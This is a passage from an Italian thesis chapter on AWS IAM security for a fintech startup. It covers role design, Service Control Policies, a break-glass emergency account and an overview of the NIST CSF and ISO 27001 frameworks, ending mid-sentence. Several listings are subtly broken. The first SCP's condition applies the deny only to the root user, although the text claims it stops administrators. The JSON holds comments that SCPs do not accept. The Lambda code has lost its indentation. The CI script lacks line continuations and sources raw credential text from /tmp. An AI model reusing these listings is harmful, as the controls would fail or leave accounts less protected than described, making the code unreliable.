  \item \textbf{\texttt{dev-privileged}}: Estende i permessi del gruppo \texttt{dev} per consentire operazioni di manutenzione specifiche su ambienti non di produzione, come la migrazione di uno schema di database di sviluppo o l'ottimizzazione dei CPU credit su istanze dev. Le azioni devono essere rigorosamente limitate a risorse con tag \texttt{Environment=dev}.
  \item \textbf{\texttt{db-migration}}: Fornisce accesso a \emph{AWS Database Migration Service} (DMS) e permessi critici come \texttt{rds:ModifyDBInstance} in produzione. L'uso di questo ruolo deve essere consentito solo durante finestre di manutenzione programmate e approvate, tracciate attraverso un sistema di ticketing.
  \item \textbf{\texttt{incident-responder}}: Abilita azioni rapide in caso di incidente di sicurezza, come lo scaling immediato di risorse, la modifica di security group, l'attivazione di \texttt{AWS Shield Advanced} o la modifica di regole \texttt{AWS WAFv2}. L'assunzione di questo ruolo, riservata ai membri del gruppo \texttt{admin}, deve generare notifiche di allarme immediate.
  \item \textbf{\texttt{breakglass-admin}}: Si tratta di un ruolo con privilegi amministrativi molto ampi (potenzialmente \texttt{AdministratorAccess}), il cui accesso è protetto da un processo di attivazione estremamente rigoroso (si veda la sezione \ref{subsubsec:break_glass_account_iam}). Il suo utilizzo è strettamente limitato a scenari di \emph{disaster recovery} estremi. Il processo di assunzione deve essere monitorato da AWS Config Rules e da allarmi CloudWatch dedicati \cite{AWSSTS}.
\end{itemize}

\subsubsection{Mappatura dei Permessi per Servizio}
\label{subsubsec:mappa_servizi_iam}
Di seguito si presenta una sintesi esemplificativa di come i permessi vengono distribuiti tra i gruppi e i ruoli.
\begin{description}
  \item[EC2] \texttt{dev}: permesso di \texttt{Start/Stop/Terminate} per le istanze di sviluppo. \texttt{backend-dev}: stessi permessi del gruppo \texttt{dev}, con l'aggiunta di \texttt{DescribeImages}. \texttt{admin}: controllo completo, ad eccezione di azioni critiche come \texttt{DeleteVpc} in produzione (limitate tramite boundary o SCP).
  \item[Elastic Beanstalk] \texttt{dev}: autorizzazione al deploy negli ambienti di sviluppo. \texttt{backend-dev}: deploy e salvataggio delle configurazioni (\texttt{eb config save}) negli ambienti di sviluppo. \texttt{admin}: gestione dei template e delle versioni delle applicazioni, anche in produzione, previa adozione di specifiche cautele \cite{AWSEBRole}.
  \item[S3] \texttt{dev}: lettura/scrittura sui bucket con suffisso \texttt{-dev}. \texttt{backend-dev}: dispone inoltre dei permessi \texttt{PutObjectAcl} su bucket di log specifici. \texttt{admin}: facoltà di modificare policy di bucket (\texttt{PutBucketPolicy}) e configurazioni di replica (\texttt{PutReplicationConfiguration}) \cite{AWSS3Security}.
  \item[Load Balancer] \texttt{dev}: sola descrizione (\texttt{Describe*}). \texttt{backend-dev}: registrazione di target nei target group di sviluppo (\texttt{RegisterTargets}). \texttt{admin}: creazione e modifica degli attributi dei load balancer su tutti gli ambienti, subordinando le modifiche in produzione a processi di approvazione formali \cite{AWSELBIAM}.
  \item[RDS] \texttt{dev}: connessione in sola lettura (\texttt{rds-db:connect}) ai database di sviluppo. \texttt{backend-dev}: esecuzione di statement tramite Data API sugli ambienti di sviluppo. \texttt{admin}: creazione di snapshot (\texttt{CreateDBSnapshot}), avvio di task di esportazione (\texttt{StartExportTask}) e gestione del failover (\texttt{FailoverDBCluster}) \cite{AWSRDSIAM}.
\end{description}
L'adozione di un approccio basato sul controllo degli accessi tramite tag, noto come \emph{Tag-Based Access Control} (ABAC), può ridurre significativamente la complessità delle policy puntuali. Questo metodo consente una gestione più scalabile degli accessi man mano che gli ambienti (sviluppo, staging, produzione) crescono o si moltiplicano \cite{AWSEC2IAM,AWSELBIAM}.

\subsubsection{Applicazione delle Service Control Policies (SCP) a Livello di Organizzazione}
\label{subsubsec:scp_livello_organizzazione}

Le \emph{Service Control Policies} (SCP) stabiliscono i confini massimi dei permessi per l'intera AWS Organization di Finanz o per specifiche \emph{Organizational Unit} (OU), agendo come un meccanismo di controllo centralizzato. Tali restrizioni non possono essere superate dagli amministratori degli account membri. A differenza degli altri account, quello di management dell'organizzazione non è soggetto a questi vincoli. In questo contesto, sono state implementate le seguenti policy strategiche:

\begin{itemize}
  \item \textbf{Prevenzione della Disattivazione di Controlli di Sicurezza Critici}: Per salvaguardare l'integrità dei meccanismi di sicurezza e l'immutabilità dell'audit trail, viene applicata una SCP ad ampio spettro. Tale policy è progettata per negare un insieme di azioni ad alto rischio, tra cui la manipolazione dei servizi di monitoraggio (AWS CloudTrail, Amazon GuardDuty, AWS Config), la modifica o l'eliminazione dei bucket S3 designati per l'archiviazione dei log, e la compromissione di ruoli IAM critici. Inoltre, essa vieta la creazione di chiavi di accesso per l'utente root, una pratica fortemente sconsigliata che introduce un rischio significativo per l'account.

  \begin{lstlisting}[style=json, caption={SCP per la protezione dei controlli di sicurezza fondamentali}, label=lst:scp-deny-security-controls]
  {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Sid": "DenyCriticalSecurityChanges",
        "Effect": "Deny",
        "Action": [
          // Prevenzione della manomissione di CloudTrail
          "cloudtrail:DeleteTrail",
          "cloudtrail:StopLogging",
          "cloudtrail:UpdateTrail",
          
          // Prevenzione della disattivazione di GuardDuty
          "guardduty:DeleteDetector",
          "guardduty:DisableOrganizationAdminAccount",
          "guardduty:DisassociateFromMasterAccount",
          
          // Prevenzione della disattivazione di AWS Config
          "config:DeleteConfigurationRecorder",
          "config:StopConfigurationRecorder",
          
          // Protezione dei bucket di log (da usare con una Condition sul Resource ARN)
          "s3:DeleteBucket",
          "s3:PutBucketPolicy",
          "s3:DeleteBucketPolicy",
          
          // Protezione di ruoli IAM critici
          "iam:DeleteRole",
          "iam:DeleteRolePolicy",
          
          // Divieto di creare chiavi di accesso per l'utente root
          "iam:CreateAccessKey",
          "iam:UpdateAccessKey",
          "iam:DeleteAccessKey"
        ],
        "Resource": "*",
        "Condition": {
          "StringLike": {
            "aws:PrincipalArn": "arn:aws:iam::*:root"
          }
        }
      }
    ]
  }
  \end{lstlisting}
    
    La verifica di una policy analoga in un ambiente di sviluppo ha confermato la sua efficacia nel bloccare i tentativi di disabilitazione di tali servizi, anche quando eseguiti da utenti con privilegi amministrativi.

    \item \textbf{Restrizione Geografica delle Regioni AWS}: Per ragioni di conformità normativa (ad esempio, il GDPR) e per ridurre la superficie d'attacco, si raccomanda di limitare l'operatività alle sole regioni AWS approvate (come \texttt{eu-central-1}, \texttt{eu-south-1} e \texttt{eu-west-1}). Una SCP può essere impiegata per impedire il provisioning di risorse in regioni non autorizzate \cite{awsbuilders:scps}.

    \begin{lstlisting}[style=json, caption={SCP per limitare le regioni AWS utilizzabili}, label=lst:scp-region-restriction]
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyNonApprovedRegions",
      "Effect": "Deny",
      "NotAction": [ 
          "iam:*", "organizations:*", "route53:*", "cloudfront:*", 
          "support:*", "health:*", "budgets:*", "waf-regional:*" 
       ],
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:RequestedRegion": [
             "eu-central-1", "eu-south-1", "eu-west-1", "us-east-1" 
          ]
        },
        "ArnNotLike": { 
            "aws:PrincipalARN": "arn:aws:iam::*:role/OrganizationAccountAccessRole"
         }
       }
    }
  ]
}
    \end{lstlisting}
    
    L'utilizzo della clausola \texttt{NotAction} è cruciale per escludere i servizi globali (come IAM e Route 53) che non sono legati a una regione specifica. La regione \texttt{us-east-1} viene inclusa in via eccezionale, poiché ospita gli endpoint di alcuni di questi servizi.

    \item \textbf{Obbligo di Autenticazione a Più Fattori (MFA)}: In linea con le più recenti direttive di sicurezza, è stata introdotta una SCP che rende obbligatoria l'autenticazione a più fattori (MFA). Questa policy nega qualsiasi operazione se non eseguita all'interno di una sessione autenticata tramite un secondo fattore, anticipando i requisiti che AWS renderà mandatori.

    \begin{lstlisting}[style=json, caption={SCP per richiedere l'uso obbligatorio di MFA (\texttt{RequireMFA})}, label=lst:scp-mfa]
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "BlockUnlessMFAPresent",
      "Effect": "Deny",
      "Action": "*",
      "Resource": "*",
      "Condition": {
        "BoolIfExists": { "aws:MultiFactorAuthPresent": "false" }
      }
    }
  ]
}
    \end{lstlisting}

\end{itemize}
\subsection{Introduzione di un Break-Glass Account}
\label{subsubsec:break_glass_account_iam}

Per scenari d’emergenza estrema, come un attacco ransomware che compromette l'IdP o errori di configurazione IAM catastrofici, è fondamentale disporre di un meccanismo di “rottura del vetro” (Break Glass). Di seguito viene delineata la soluzione proposta, con ID, nomenclatura e servizi aggiornati per coerenza.

\begin{enumerate}
\item \textbf{Account AWS dedicato e isolato}:
Viene creato un nuovo account AWS all'interno dell'Organization (\texttt{o-4g2j3d5e6l}), posizionato nella OU «Security». Questo account, con ID riservato \texttt{538927841179}, è mantenuto operativamente isolato, senza risorse operative e con un ciclo di fatturazione separato per garantirne l'integrità.

\item \textbf{Utente di emergenza \texttt{BreakGlassEmergencyUser}}:
All'interno dell'account Break-Glass, viene configurato un singolo utente IAM, il cui ARN è \texttt{arn:aws:iam::538927841179:user/BreakGlassEmergencyUser}. La sua sicurezza è affidata a una password di 32 caratteri generata casualmente, custodita in una busta fisica sigillata, e a un dispositivo MFA hardware FIDO2 dedicato (es. YubiKey, Seriale: \texttt{YK-87654321}). Per ridurre la superficie d'attacco, l'utente non dispone di access key permanenti e la sua unica abilità è quella di poter assumere il ruolo \texttt{BreakGlassAdminRole}.

\item \textbf{Ruolo amministrativo \texttt{BreakGlassAdminRole}}:
Questo ruolo, definito nell'account Break-Glass, è il fulcro operativo del meccanismo. È associato alla policy gestita \texttt{AdministratorAccess} e la sua \emph{trust-policy} è configurata per consentire l'assunzione del ruolo esclusivamente da parte di \texttt{BreakGlassEmergencyUser}. A sua volta, il ruolo è autorizzato, tramite \texttt{sts:AssumeRole}, ad assumere il ruolo \texttt{OrganizationAccountAccessRole} presente in tutti gli altri account operativi, garantendo così la capacità di intervento a livello di intera organizzazione.

\item \textbf{Procedura di attivazione rigorosa}:
L'utilizzo del Break-Glass Account è un evento eccezionale, la cui attivazione richiede un'autorizzazione congiunta e tracciata del CEO e del CTO, con la registrazione formale dell'evento in ServiceNow. Ogni sessione attivata ha una durata massima di 8 ore e deve essere seguita da una revisione post-incidente obbligatoria per analizzare le cause e le azioni intraprese.

\item \textbf{Monitoraggio e lockdown \-automatico}:
È implementato un sistema di monitoraggio intensivo. Una regola EventBridge rileva ogni evento di login (\lstinline|aws.signin|) e invia una notifica immediata al topic SNS \texttt{security-alerts-breakglass}. Inoltre, una funzione Lambda (\texttt{breakglass-auto-restrict}) viene attivata per applicare automaticamente una \emph{permissions-boundary} restrittiva al ruolo qualora la sessione superi la durata di 8 ore, limitando così la finestra di esposizione al rischio.

\end{enumerate}

\paragraph{Lambda di auto-restrizione}
Viene di seguito mostrata l'implementazione della Lambda per il lockdown automatico del ruolo.
\begin{lstlisting}[style=python, caption={Lambda semplificata di auto-lock del ruolo}, label=lst:breakglass-lambda]
import os, boto3, json
from datetime import datetime, timedelta, timezone

iam = boto3.client("iam")
sns = boto3.client("sns")
ROLE_ARN = os.environ["ROLE_TO_ASSUME"] # arn:aws:iam::538927841179:role/BreakGlassAdminRole
BOUNDARY_ARN = os.environ["RESTRICTIVE_POLICY_ARN"]
SNS_TOPIC_ARN = os.environ["SNS_TOPIC_ARN"]

def lambda_handler(event, _):
# l'evento trigger contiene il timestamp di inizio sessione
session_start = datetime.now(timezone.utc)
expiry = session_start + timedelta(hours=8)

# --- Logica di business: applica il boundary al ruolo ---
iam.put_role_permissions_boundary(
    RoleName = ROLE_ARN.split('/')[-1],
    PermissionsBoundary = BOUNDARY_ARN
)

msg = (f"Break-Glass session restricted at {session_start.isoformat()}. "
       f"Boundary {BOUNDARY_ARN} applicato; scade alle {expiry.isoformat()}")
sns.publish(TopicArn=SNS_TOPIC_ARN, Subject="Break-Glass lockdown", Message=msg)
return {"statusCode": 200, "body": json.dumps({"message": "Boundary applied"})}


\end{lstlisting}

\subsubsection{Utilizzo sistematico di credenziali temporanee (STS)}
Per mitigare il rischio associato a credenziali statiche a lunga durata, è cruciale imporre l'uso di credenziali temporanee ottenute tramite il servizio AWS Security Token Service (STS).
\begin{itemize}
\item \textbf{Accesso umano}: Gli operatori devono accedere tramite Identity Center, che gestisce l'assunzione di ruoli specifici e fornisce credenziali temporanee con una durata limitata (es. 1 ora), valide sia per la console che per la CLI.
\item \textbf{Workload applicativi}: I servizi di calcolo (EC2, ECS, Lambda) devono essere associati a un ruolo IAM. Le credenziali temporanee vengono fornite e rinnovate automaticamente dall'ambiente di esecuzione (es. tramite IMDSv2), eliminando la necessità di gestire chiavi statiche nel codice.
\item \textbf{Script e pipeline CI/CD}: Gli script e i processi automatizzati devono utilizzare il comando \lstinline|aws sts assume-role| per ottenere credenziali a breve termine (durata consigliata < 1 ora) legate a ruoli "runner" dedicati, creati con il minimo privilegio necessario.
\end{itemize}

\begin{lstlisting}[style=bash, caption={Esempio di Assume-Role in uno script CI}, label=lst:sts-script]

#Ottiene credenziali temporanee e le scrive in un file

aws sts assume-role
--role-arn arn:aws:iam::538927841179:role/S3ReadOnlyForFinanzScript
--role-session-name $(date +FinanzScript_%Y%m%d_%H%M%S)
--duration-seconds 3600
--query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]'
--output text > /tmp/aws-creds

#Esporta le credenziali come variabili d'ambiente

source /tmp/aws-creds

#Ora i comandi AWS CLI usano le credenziali temporanee

aws s3 ls s3://finanz-data-dev/

#unset delle variabili al termine dell'esecuzione

unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
\end{lstlisting}

\subsection{Implementazione di un Workflow di Approvazione a Due Fasi (Opzionale)}
\label{subsubsec:approvazione_due_fasi}
Per operazioni ad altissimo impatto (es. eliminazione di un bucket S3 in produzione, disattivazione del logging), si può introdurre un workflow di approvazione multi-persona, orchestrato tramite AWS Step Functions.

\begin{enumerate}
\item \textbf{Trigger dell'operazione}: Un utente, pur non avendo il permesso diretto, avvia l'operazione critica invocando un endpoint di API Gateway che, a sua volta, attiva la state machine di Step Functions \texttt{critical-op-approval}.
\item \textbf{Notifica agli approvatori}: La state machine invia una richiesta di approvazione tramite SNS a un canale Slack dedicato, notificando le figure responsabili (es. CTO, Responsabile Compliance).
\item \textbf{Raggiungimento del quorum}: Il workflow attende che tutte le approvazioni richieste vengano concesse entro un tempo limite predefinito (es. 2 ore).
\item \textbf{Esecuzione controllata}: Solo a seguito del raggiungimento del quorum, la state machine procede invocando una funzione Lambda che assume un ruolo ad-hoc (\texttt{CriticalOpsRole}) per eseguire l'azione richiesta.
\item \textbf{Audit completo}: Ogni stato del processo (richiesta, approvazione, esecuzione, esito) viene meticolosamente registrato in una tabella DynamoDB e tracciato in CloudTrail, garantendo una piena auditabilità.
\end{enumerate}

Tale flusso, pur introducendo un leggero overhead, riduce drasticamente il rischio di azioni irreversibili accidentali o malevole, senza ostacolare in modo significativo la velocità operativa.

\section{Conclusioni sulla Sicurezza IAM}
L'intervento strategico sulla gestione delle identità e degli accessi, descritto in questo capitolo, ha trasformato la postura di sicurezza dell'infrastruttura AWS di Finanz, spostandola da un modello permissivo e ad alto rischio a un'architettura allineata ai principi di Zero Trust e del Minimo Privilegio (PoLP). L'implementazione delle misure proposte ha risolto in modo sistematico le criticità identificate nell'analisi iniziale (Sezione \ref{subsec:analisi_iam_finanz}), raggiungendo risultati concreti e misurabili. Tra questi, spiccano la messa in sicurezza dell'account root, l'eliminazione dei privilegi amministrativi permanenti per gli utenti IAM, l'imposizione dell'autenticazione a più fattori (MFA) e, soprattutto, l'introduzione di un modello granulare basato su gruppi e ruoli temporanei. L'applicazione di guardrail preventivi tramite Permission Boundaries e Service Control Policies (SCP) ha ridotto drasticamente la superficie d'attacco e il potenziale raggio d'esplosione (blast radius) in caso di compromissione di un'identità.

Tuttavia, è fondamentale riconoscere che tale rafforzamento della sicurezza introduce nuove considerazioni operative e non è esente da limitazioni. La principale contropartita è un leggero aumento dell'overhead operativo, in particolare per il team di sviluppo, che deve ora operare tramite l'assunzione di ruoli specifici (sts:AssumeRole) anziché con permessi diretti e persistenti. Questo modello impone anche un onere di manutenzione continua: le policy IAM devono essere periodicamente revisionate e aggiornate per adattarsi all'introduzione di nuovi servizi AWS o all'evoluzione delle responsabilità dei team. Inoltre, il passaggio a un regime di controllo così rigoroso richiede una necessaria evoluzione culturale all'interno della startup, supportata da formazione continua per garantire che i nuovi processi di accesso vengano compresi e adottati correttamente, senza che diventino un ostacolo alla produttività.

In conclusione, la sicurezza IAM non deve essere concepita come un traguardo, ma come un processo dinamico e iterativo. Le fondamenta gettate in questo capitolo trascendono la mera mitigazione del rischio, trasformando la gestione degli accessi in un asset strategico per Finanz. Stabilire un framework sicuro, granulare e verificabile fin dalle prime fasi non solo protegge i dati sensibili, ma costruisce la fiducia necessaria per supportare una crescita aziendale ambiziosa e sostenibile nel competitivo settore fintech.



\chapter{Compliance a standard internazionali e framework di sicurezza} 
\label{chapter:introduzione}
A differenza delle istituzioni bancarie tradizionali, le fintech emergono spesso in un contesto con minori vincoli normativi iniziali e con una strategia di time-to-market particolarmente aggressiva. Tale approccio può condurre, talvolta, a una sottovalutazione degli aspetti di sicurezza nelle fasi primordiali di sviluppo \cite{netguru2023}. La frequenza e la rapidità dei cicli di rilascio possono indurre queste aziende a \textbf{omettere o posticipare l'implementazione di misure di sicurezza} non percepite come immediatamente essenziali per il core business \cite{netguru2023}. Ne consegue che molte soluzioni fintech, sebbene innovative sotto il profilo tecnologico, possono presentare controlli di sicurezza parziali o deboli, incrementando la probabilità di incidenti di sicurezza rispetto a istituzioni finanziarie più consolidate e regolamentate.

In questo scenario complesso, diviene cruciale l'adozione di \textbf{principi di cybersecurity strutturati} e fondati su framework riconosciuti a livello internazionale. Tali framework offrono un approccio sistematico per l'identificazione dei rischi, l'implementazione di controlli adeguati e la garanzia della resilienza dei sistemi. Nel prosieguo del capitolo, verranno analizzati i principali framework e standard di sicurezza informatica – dal \textbf{NIST Cybersecurity Framework (CSF)} all'ISO/IEC 27001, passando per linee guida NIST specifiche (SP 800-53, SP 800-82 per l'OT e SP 800-63B per le password) fino ai modelli di \textbf{Zero Trust}. Verrà illustrato come tali approcci possano essere applicati concretamente alla protezione dell'infrastruttura cloud di una startup fintech, con un focus particolare sui server e sui dati ospitati su \textbf{Amazon Web Services (AWS)}. Saranno inoltre discusse \textbf{best practice e strategie di mitigazione} delle minacce più comuni, considerando le peculiarità degli ambienti cloud-native come AWS e l'importanza di un approccio di \enquote{difesa in profondità} (defense in depth) integrato con i requisiti normativi di settore.

Prima di addentrarci nell'analisi dei framework, è fondamentale richiamare il modello di responsabilità condivisa nel cloud (Shared Responsibility Model): \textbf{AWS è responsabile della sicurezza \enquote{of the cloud}}, ovvero della protezione dell'infrastruttura fisica e dei servizi di base (data center, hardware, rete, virtualizzazione), mentre \textbf{al cliente spetta la sicurezza \enquote{in the cloud}}, cioè la configurazione sicura dei propri ambienti virtuali, la gestione degli accessi, della rete, dei dati e delle applicazioni \cite{awsResponsibility}. In altri termini, una fintech che opera su AWS deve implementare controlli di rete adeguati, cifratura, identity management, monitoring e altre misure, costruendo su una fondazione sicura fornita dal cloud provider ma senza delegare integralmente la propria responsabilità. Tenendo presente questo principio, esaminiamo ora i framework di sicurezza e come essi guidano l'implementazione di misure difensive su AWS.

\section{NIST Cybersecurity Framework (CSF)}
\label{sec:nist_csf}

Il \textbf{NIST Cybersecurity Framework (CSF)}, sviluppato dal National Institute of Standards and Technology statunitense, è un framework di riferimento ampiamente adottato a livello globale come base per la gestione del rischio cyber in organizzazioni di qualsiasi settore o dimensione \cite{awsNist}. Originariamente concepito per la protezione delle infrastrutture critiche, il CSF è strutturato in cinque funzioni fondamentali – \textbf{Identify, Protect, Detect, Respond, Recover} – che rappresentano il ciclo continuo della gestione della sicurezza. Recentemente, con la versione 2.0 del 2024, è stata introdotta una sesta funzione, \textbf{\enquote{Govern}}, a sottolineare l'importanza cruciale delle attività organizzative e di governance nella gestione del rischio cyber \cite{awsWhitepaperCSF2}. Ciascuna funzione si articola in categorie e sottocategorie di controlli di sicurezza, fornendo così una tassonomia delle capacità di cybersecurity che un'organizzazione dovrebbe sviluppare. Ad esempio, il CSF include categorie che coprono l'identificazione degli asset critici, la protezione tramite controlli di accesso e cifratura, il monitoraggio continuo degli eventi di sicurezza, la gestione degli incidenti e la resilienza operativa post-attacco.

Per una startup fintech che opera su AWS, il NIST CSF fornisce una \textbf{mappa concettuale} per implementare misure di sicurezza cloud in modo coerente e completo. AWS stessa riconosce il CSF come framework di riferimento e mette a disposizione linee guida su come allineare i propri servizi alle diverse funzioni del CSF \cite{awsWhitepaperCSF2}. In pratica:

\subsection{Identify (Identifica)}
\label{subsec:nist_csf_identify}
Questa funzione riguarda l'inventario e la classificazione di risorse, dati, software e flussi di lavoro critici. Su AWS, ciò implica mappare tutti i servizi in uso (ad esempio, istanze EC2, database RDS, bucket S3), identificare i dati sensibili (come i dati finanziari dei clienti) e valutarne l'impatto potenziale in caso di compromissione. Strumenti AWS come AWS Config e AWS Resource Explorer sono utili per mantenere la visibilità sugli asset cloud. È altresì importante identificare le dipendenze da terze parti (es. API bancarie, servizi di pagamento esterni) e i rischi associati alla supply chain, in linea con l'enfasi posta dal CSF 2.0 sulla sicurezza della catena di fornitura \cite{awsWhitepaperCSF2}.

\subsection{Protect (Proteggi)}
\label{subsec:nist_csf_protect}
Comprende tutte le misure volte a salvaguardare servizi e dati. In un'infrastruttura AWS, ciò include:
\begin{itemize}
    \item \textbf{Protezione della rete cloud}: tramite Virtual Private Cloud (VPC) ben progettati e segmentati (suddividendo ambienti di produzione, staging e test in subnet isolate), l'uso di \textbf{Security Group} e \textbf{Network ACL} per filtrare il traffico, e l'adozione di Web Application Firewall (WAF) come AWS WAF per difendersi da attacchi a livello applicativo. Possono essere integrate soluzioni di terze parti per rafforzare il perimetro, come analizzato successivamente con Check Point Quantum (Sezione \ref{sec:checkpoint_quantum}).
    \item \textbf{Sicurezza dei dati}: su AWS è fondamentale cifrare i dati sia \textbf{a riposo} (at-rest), ad esempio tramite AWS Key Management Service (KMS) per la gestione delle chiavi di cifratura e abilitando la crittografia su servizi come EBS, S3, RDS, sia \textbf{in transito} (in-transit), utilizzando protocolli TLS per API ed endpoint, e VPN/IPSec per connessioni private. Il controllo degli accessi ai dati va implementato con rigidi permessi IAM e policy di bucket S3 che limitino l'accesso solo ai ruoli o servizi autorizzati.
    \item \textbf{Gestione delle identità e degli accessi (IAM)}: il CSF prescrive di implementare il principio del minimo privilegio (Principle of Least Privilege - PoLP) e misure di autenticazione robusta. AWS IAM consente di definire ruoli e policy granulari, abilitare l'Autenticazione Multi-Fattore (MFA) sugli account (incluso l'account root, che dovrebbe essere particolarmente protetto) e centralizzare la gestione identitaria (ad esempio, integrando provider SAML/SSO per gli utenti). L'uso di IAM Roles con credenziali temporanee per servizi e applicazioni riduce il rischio di esposizione di credenziali statiche. Queste misure rispecchiano i \textbf{principi Zero Trust} (si veda la Sezione \ref{sec:zero_trust}).
    \item \textbf{Protezione dei sistemi e delle applicazioni}: ciò si traduce in hardening delle istanze (applicazione sistematica di patch a sistemi operativi e middleware, disabilitazione di servizi non necessari), utilizzo di servizi gestiti AWS (es. RDS, Lambda) che sollevano dall'onere di gestire direttamente i server e riducono la superficie d'attacco, e impostazione di backup regolari e meccanismi di disaster recovery (snapshots, replicazione tra region) per garantire resilienza (quest'ultimo aspetto sconfina nella funzione Recover).
\end{itemize}

\subsection{Detect (Individua)}
\label{subsec:nist_csf_detect}
Il framework enfatizza la capacità di rilevare tempestivamente eventi anomali e possibili incidenti di sicurezza. Su AWS, le attività di \textbf{logging e monitoring} sono fondamentali. Ogni risorsa cloud dovrebbe generare log appropriati:
\begin{itemize}
    \item AWS CloudTrail per tracciare tutte le chiamate API e le attività nell'account.
    \item AWS CloudWatch per metriche di sistema e applicative, con la possibilità di configurare allarmi in caso di valori anomali.
    \item AWS Config per registrare i cambiamenti di configurazione delle risorse.
\end{itemize}
Servizi avanzati come Amazon GuardDuty forniscono un monitoraggio continuo delle minacce analizzando pattern di traffico e log (ad esempio, identificando comportamenti anomali indicativi di credenziali compromesse o istanze malevole). Analogamente, Amazon Macie può essere utilizzato per rilevare eventuali esposizioni di dati sensibili su S3. L'aggregazione centralizzata dei log (ad esempio, in un servizio come Amazon S3 o CloudWatch Logs) e la loro correlazione tramite un sistema SIEM (Security Information and Event Management) – AWS offre AWS Security Hub per correlare avvisi da vari servizi – consente di \textbf{abilitare alerting in tempo reale} verso il team di sicurezza. Queste capacità rispondono all'esigenza di \textit{traceability}: ogni azione o modifica nell'ambiente cloud deve essere tracciata e monitorata, come raccomandato anche dall'AWS Well-Architected Framework \cite{awsWellArchitected}.

\subsection{Respond (Rispondi)}
\label{subsec:nist_csf_respond}
Questa funzione definisce le attività di \textbf{gestione degli incidenti} (incident response) nel momento in cui si verifica un problema di sicurezza. Una startup fintech, anche di piccole dimensioni, dovrebbe disporre di un piano di incident response che includa procedure per analizzare gli eventi, contenere l'incidente (ad esempio, isolando istanze compromesse, ruotando chiavi API esposte), eradicare la minaccia e ripristinare i servizi. AWS mette a disposizione strumenti che coadiuvano la risposta: AWS CloudTrail facilita le indagini forensi permettendo di ricostruire le azioni compiute da un aggressore; servizi come AWS IAM Access Analyzer possono essere usati per verificare e revocare accessi non intenzionali; AWS Systems Manager Incident Manager aiuta a orchestrare la risoluzione degli incidenti coordinando notifiche e runbook automatici. È buona prassi condurre simulazioni di incidenti (es. tabletop exercises, game-days) per addestrare il team a rispondere efficacemente, come suggerito anche dal Well-Architected Framework \cite{awsWellArchitected}. Inoltre, è necessario considerare gli adempimenti di notifica: in caso di violazione di dati personali (data breach), ad esempio, il GDPR impone la comunicazione all'autorità di controllo competente (es. Garante per la Protezione dei Dati Personali) entro 72 ore dalla scoperta, quindi il processo di incident response deve includere meccanismi di escalation manageriale e legale.

\subsection{Recover (Recupera)}
\label{subsec:nist_csf_recover}
La funzione Recover riguarda la \textbf{resilienza operativa} e la capacità di ripristinare rapidamente i servizi a seguito di un incidente o di un guasto, minimizzando l'impatto sugli utenti e sui partner commerciali. In ambito AWS, questo si traduce nel disporre di backup (preferibilmente offline o immutabili) e piani di \textbf{disaster recovery (DR)} testati regolarmente. Una fintech potrebbe, ad esempio, mantenere backup crittografati dei database finanziari (utilizzando AWS Backup per centralizzare e automatizzare i backup di RDS, EBS, DynamoDB, ecc.) e predisporre infrastrutture di ripristino in una regione AWS secondaria per far fronte a eventi catastrofici che potrebbero colpire la regione primaria. Servizi come Amazon S3 garantiscono una durabilità estremamente elevata per i dati (undici 9, ovvero 99.999999999\%) e offrono funzionalità di versioning degli oggetti, permettendo il recupero di dati alterati o cancellati accidentalmente. La fase di Recover include anche le comunicazioni post-incidente e il miglioramento continuo: dopo il ripristino, è importante condurre un'analisi post-mortem (lessons learned), comprendere le cause alla radice dell'incidente e aggiornare i controlli di sicurezza per prevenire il ripetersi di eventi simili \cite{awsWhitepaperCSF2}.

\section{ISO/IEC 27001 e Sistemi di Gestione della Sicurezza (ISMS)}
\label{sec:iso_27001}
Lo standard \textbf{ISO/IEC 27001} è il riferimento internazionale per stabilire, implementare, mantenere e migliorare continuamente un \textit{Information Security Management System} (\textbf{ISMS}), ovvero un sistema di gestione della sicurezza delle informazioni omnicomprensivo. Si tratta di un framework gestionale che adotta un approccio basato sul rischio (risk-based approach) per garantire la \textbf{riservatezza, integrità e disponibilità (CIA triad)} delle informazioni aziendali, attraverso un insieme strutturato di controlli di sicurezza organizzativi, fisici e tecnici. ISO/IEC 27001 è riconosciuto globalmente ed è applicato da organizzazioni in tutti i settori come \textbf{benchmark} di best practice per la sicurezza delle informazioni.

Il nucleo della norma è l'applicazione del ciclo PDCA (Plan-Do-Check-Act) alla sicurezza:
\begin{description}
    \item[Plan:] L'organizzazione deve condurre una valutazione dei rischi (identificando asset informativi, minacce, vulnerabilità e impatti), definire l'ambito dell'ISMS e selezionare gli obiettivi di controllo e i controlli.
    \item[Do:] Implementare e operare i controlli e i processi dell'ISMS.
    \item[Check:] Monitorare e riesaminare periodicamente l'efficacia dell'ISMS, confrontando le performance con gli obiettivi e i requisiti.
    \item[Act:] Mantenere e migliorare continuamente l'ISMS intraprendendo azioni correttive e preventive basate sui risultati del riesame.
\end{description}
L'Annex A dello standard (edizione 2022) fornisce un elenco di riferimento di 93 controlli, organizzati in 4 domini tematici (Organizzativi, Persone, Fisici, Tecnologici). La certificazione ISO/IEC 27001, rilasciata da un ente terzo accreditato, attesta che l'organizzazione aderisce a questo processo e rispetta tutti i requisiti dello standard.

Per una startup fintech, ottenere la certificazione ISO/IEC 27001 può rappresentare un importante fattore abilitante di fiducia sul mercato – specialmente se si rivolge a clientela enterprise o ad altre istituzioni finanziarie – ma può anche costituire una sfida, data la mole di processi e misure da implementare. L'adozione di servizi cloud AWS può, tuttavia, facilitare il percorso verso la conformità ISO/IEC 27001. AWS stessa è certificata ISO/IEC 27001 per la propria infrastruttura globale di servizi cloud (oltre ad altre certificazioni rilevanti come ISO/IEC 27017 per i controlli specifici per il cloud e ISO/IEC 27018 per la protezione della privacy nel cloud). Ciò significa che i data center e i servizi AWS sono gestiti secondo controlli di sicurezza riconosciuti, permettendo alla fintech di concentrarsi sui controlli applicativi e organizzativi, sapendo che molti requisiti infrastrutturali di base – ad esempio sulla protezione fisica dei server, il controllo degli accessi ai locali, la continuità elettrica e di rete – sono già coperti e attestati dalla piattaforma AWS. Ciononostante, la \textbf{responsabilità dell'implementazione} dei controlli relativi ai propri dati e configurazioni nel cloud rimane in capo al cliente, in linea con il modello di responsabilità condivisa. Ad esempio, ISO/IEC 27001 richiede di controllare gli 